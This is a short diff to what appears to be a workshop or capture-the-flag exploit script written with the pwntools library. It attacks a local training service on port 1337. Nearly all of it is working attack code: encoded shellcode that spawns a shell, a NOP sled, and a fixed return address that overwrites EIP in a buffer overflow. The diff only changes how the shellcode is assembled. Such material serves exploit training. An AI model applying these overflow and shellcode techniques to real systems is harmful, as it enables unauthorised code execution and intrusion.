@@ -3,14 +3,13 @@
 # Pwnies workshop server level 1
 
 from pwn.classic import *
-from pwn.i386 import scramble
 
 sock = remote('localhost', 1337, timeout = 120)
 sock.recvuntil('Your output to my input? Do your best!\n')
 
 tag = random32()
 # Scramble it because it contains a newline
-shellcode = scramble(asm(findtagsh(tag)), avoid = '\x00\n')
+shellcode = scramble(findtagsh(tag), avoid = '\x00\n')
 
 eip = 0x0804a080
 sock.send(flat(nop_pad(0xD4, shellcode), eip, '\n'))
